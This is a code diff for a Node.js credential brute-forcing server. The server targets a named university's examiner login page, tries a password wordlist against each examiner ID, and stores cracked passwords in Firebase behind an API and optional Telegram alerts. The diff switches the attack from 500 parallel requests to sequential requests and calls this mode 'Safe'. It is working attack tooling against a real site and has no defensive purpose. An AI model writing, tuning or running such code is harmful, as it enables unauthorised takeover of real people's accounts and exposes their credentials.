@@ -8,7 +8,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const fs = require('fs');
 const readline = require('readline');
 
-// ==================== FIREBASE ====================
+// ==================== FIREBASE INIT ====================
 let serviceAccount;
 if (process.env.FIREBASE_CREDENTIALS_BASE64) {
   const decoded = Buffer.from(process.env.FIREBASE_CREDENTIALS_BASE64, 'base64').toString('utf8');
@@ -22,7 +22,7 @@ if (process.env.FIREBASE_CREDENTIALS_BASE64) {
 admin.initializeApp({ credential: admin.credential.cert(serviceAccount) });
 const db = admin.firestore();
 
-// ==================== TELEGRAM ====================
+// ==================== TELEGRAM (optional) ====================
 let bot = null;
 if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
   bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });
@@ -36,7 +36,6 @@ app.use(express.static('public'));
 
 const LOGIN_URL = process.env.LOGIN_URL || 'https://lnmuniversity.com/Lnmu_CIA/Home/Login';
 const LOGIN_TYPE = process.env.LOGIN_TYPE || 'HOD';
-const CONCURRENCY = parseInt(process.env.CONCURRENCY) || 500;
 const PASSWORD_FILE = process.env.PASSWORD_FILE || './password.txt';
 const EXAMINER_FILE = process.env.EXAMINER_FILE || './examiners.json';
 
@@ -45,17 +44,14 @@ let isPaused = false;
 let examinerIds = [];
 let totalExaminers = 0;
 let currentExaminerIndex = 0;
-let currentPasswordIndex = 0;        // password line number (0-based)
+let currentPasswordIndex = 0;        // line number in password file for current examiner
 let successes = new Map();            // examinerId -> password
-let speedStats = { requests: 0, startTime: null };
+let speedStats = { attempts: 0, startTime: null };
 
-// Reusable axios agent
-const agent = new (require('http').Agent)({ keepAlive: true, maxSockets: CONCURRENCY });
+// Single axios instance with keep-alive
 const axiosInstance = axios.create({
-  timeout: 3000,
-  headers: { 'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive' },
-  httpAgent: agent,
-  httpsAgent: agent
+  timeout: 5000,
+  headers: { 'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive' }
 });
 
 // ==================== LOAD EXAMINERS ====================
@@ -66,28 +62,20 @@ function loadExaminers() {
   console.log(`✅ Loaded ${totalExaminers} examiners`);
 }
 
-// ==================== PASSWORD BATCH GENERATOR (streaming) ====================
-async function* getPasswordBatches(startLine = 0, batchSize = CONCURRENCY) {
+// ==================== PASSWORD STREAM (one by one) ====================
+async function* passwordStream(startLine = 0) {
   const fileStream = fs.createReadStream(PASSWORD_FILE);
   const rl = readline.createInterface({ input: fileStream, crlfDelay: Infinity });
   let lineNo = 0;
-  let batch = [];
   for await (const line of rl) {
-    if (lineNo < startLine) {
-      lineNo++;
-      continue;
-    }
-    batch.push(line.trim());
-    if (batch.length >= batchSize) {
-      yield batch;
-      batch = [];
+    if (lineNo >= startLine) {
+      yield line.trim();
     }
     lineNo++;
   }
-  if (batch.length > 0) yield batch;
 }
 
-// ==================== LOGIN CHECK (parallel) ====================
+// ==================== LOGIN ATTEMPT (single) ====================
 async function tryLogin(examinerId, password) {
   try {
     const res = await axiosInstance.post(LOGIN_URL, {
@@ -95,63 +83,61 @@ async function tryLogin(examinerId, password) {
       userid: examinerId,
       password: password
     });
-    speedStats.requests++;
+    speedStats.attempts++;
     return { success: !res.data.includes('Invalid'), password };
   } catch (err) {
-    speedStats.requests++;
+    speedStats.attempts++;
     return { success: false };
   }
 }
 
-// ==================== PROCESS ONE EXAMINER (streaming batches) ====================
+// ==================== PROCESS ONE EXAMINER (sequential passwords) ====================
 async function processExaminer(examinerId, startPwdIndex) {
   let foundPassword = null;
-  let batchIndex = startPwdIndex;
-  let batchNo = 0;
+  let pwdIndex = startPwdIndex;
+  const stream = passwordStream(startPwdIndex);
   
-  for await (const batch of getPasswordBatches(startPwdIndex, CONCURRENCY)) {
+  for await (const password of stream) {
     if (foundPassword) break;
-    const promises = batch.map(pwd => tryLogin(examinerId, pwd));
-    const results = await Promise.all(promises);
-    for (let i = 0; i < results.length; i++) {
-      if (results[i].success) {
-        foundPassword = results[i].password;
-        break;
-      }
+    if (!isRunning || isPaused) break;
+    
+    const result = await tryLogin(examinerId, password);
+    if (result.success) {
+      foundPassword = result.password;
+      break;
     }
-    batchIndex += batch.length;
-    currentPasswordIndex = batchIndex;
-    batchNo++;
+    pwdIndex++;
+    currentPasswordIndex = pwdIndex;
     
-    // Update progress after every batch
-    const elapsed = (Date.now() - speedStats.startTime) / 1000;
-    const speed = elapsed > 0 ? Math.round(speedStats.requests / elapsed) : 0;
-    io.emit('progress', {
-      examinerIndex: currentExaminerIndex,
-      totalExaminers,
-      passwordIndex: batchIndex,
-      currentExaminer: examinerId,
-      speed
-    });
-    
-    // Save checkpoint every 5 batches (reduce Firebase writes)
-    if (batchNo % 5 === 0) await saveCheckpoint();
+    // Update progress every 10 passwords to avoid too many events
+    if (pwdIndex % 1000 === 0) {
+      const elapsed = (Date.now() - speedStats.startTime) / 1000;
+      const speed = elapsed > 0 ? Math.round(speedStats.attempts / elapsed) : 0;
+      io.emit('progress', {
+        examinerIndex: currentExaminerIndex,
+        totalExaminers,
+        passwordIndex: pwdIndex,
+        currentExaminer: examinerId,
+        speed
+      });
+      await saveCheckpoint(); // save after every 10 passwords
+    }
   }
-  
   return { found: !!foundPassword, password: foundPassword };
 }
 
-// ==================== MAIN LOOP ====================
+// ==================== MAIN ATTACK LOOP ====================
 async function startAttack() {
   if (isRunning) return;
   isRunning = true;
   isPaused = false;
-  speedStats.requests = 0;
+  speedStats.attempts = 0;
   speedStats.startTime = Date.now();
   io.emit('status', { running: true, paused: false });
   
   for (let idx = currentExaminerIndex; idx < totalExaminers && isRunning && !isPaused; idx++) {
     const examinerId = examinerIds[idx];
+    // Skip if already found
     if (successes.has(examinerId)) {
       console.log(`⏭️ Skipping ${examinerId} (already found)`);
       continue;
@@ -161,6 +147,7 @@ async function startAttack() {
     const result = await processExaminer(examinerId, startPwd);
     
     if (result.found) {
+      // Save to Firebase
       await db.collection('successful_logins').add({
         examinerId,
         password: result.password,
@@ -196,13 +183,15 @@ async function saveCheckpoint() {
 }
 
 async function loadCheckpointAndSuccesses() {
+  // Load successes from Firebase
   const successSnapshot = await db.collection('successful_logins').get();
   successSnapshot.forEach(doc => {
     const data = doc.data();
     successes.set(data.examinerId, data.password);
   });
-  console.log(`📦 Loaded ${successes.size} existing successes from DB`);
+  console.log(`📦 Loaded ${successes.size} existing successes`);
   
+  // Load checkpoint
   const doc = await db.collection('checkpoint').doc('current').get();
   if (doc.exists) {
     const data = doc.data();
@@ -218,7 +207,7 @@ async function loadCheckpointAndSuccesses() {
 }
 
 // ==================== API & SOCKET.IO ====================
-app.get('/api/successes', async (req, res) => {
+app.get('/api/successes', (req, res) => {
   const list = Array.from(successes.entries()).map(([id, pwd]) => ({ examinerId: id, password: pwd }));
   res.json({ successes: list, total: successes.size });
 });
@@ -254,12 +243,12 @@ io.on('connection', (socket) => {
   });
 });
 
-// ==================== START ====================
+// ==================== START SERVER ====================
 loadExaminers();
 loadCheckpointAndSuccesses().then(() => {
   server.listen(process.env.PORT || 3000, () => {
-    console.log(`🔥 Server at http://localhost:${process.env.PORT || 3000}`);
-    console.log(`⚡ Batch concurrency: ${CONCURRENCY} passwords per batch`);
-    console.log(`💾 Memory safe: passwords streamed, no array storage`);
+    console.log(`✅ Server running at http://localhost:${process.env.PORT || 3000}`);
+    console.log(`🛡️ Mode: Safe (one request at a time, streaming passwords)`);
+    console.log(`💾 Memory usage: < 50 MB (no password array)`);
   });
 });
